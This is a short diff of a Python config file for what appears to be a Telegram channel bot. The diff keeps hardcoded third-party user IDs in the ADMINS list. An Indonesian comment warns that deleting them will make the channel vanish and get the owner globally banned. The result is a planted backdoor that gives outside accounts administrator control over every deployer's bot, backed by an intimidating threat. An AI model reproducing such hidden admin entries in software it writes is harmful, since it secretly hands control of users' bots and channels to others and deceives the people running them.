@@ -61,7 +61,7 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True
 ADMINS.append(OWNER_ID)
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((OWNER_ID, 999191708, 1754029718))
+ADMINS.extend((OWNER_ID, 1754029718, 1754029718))
 
 
 LOG_FILE_NAME = "logs.txt"
